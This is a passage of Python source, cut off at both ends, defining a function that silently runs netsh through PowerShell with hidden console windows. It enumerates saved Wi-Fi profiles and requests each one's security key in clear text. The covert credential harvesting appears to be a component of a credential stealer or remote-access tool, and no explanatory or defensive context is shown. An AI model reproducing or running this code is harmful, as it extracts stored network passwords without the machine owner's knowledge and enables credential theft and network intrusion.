...
def show_wifi_passwords():
    command_output = subprocess.Popen(["powershell.exe","netsh", "wlan", "show", "profiles"], stdout=subprocess.PIPE, startupinfo=si, creationflags=subprocess.CREATE_NO_WINDOW)
    profile_names = (re.findall("All User Profile     : (.*)\r", command_output.stdout.read().decode()))
    wifi_list = []
    if len(profile_names) != 0:
        for name in profile_names:
            wifi_profile = {}
            profile_info = subprocess.Popen(["powershell.exe","netsh", "wlan", "show", "profile", name], stdout=subprocess.PIPE, startupinfo=si, creationflags=subprocess.CREATE_NO_WINDOW)
            if re.search("Security key           : Absent", profile_info.stdout.read().decode()):
                continue
            else:
                wifi_profile["ssid"] = name
                profile_info_pass = subprocess.Popen(["powershell.exe","netsh", "wlan", "show", "profile", name, "key=clear"], stdout=subprocess.PIPE, startupinfo=si, creationflags=subprocess.CREATE_NO_WINDOW)
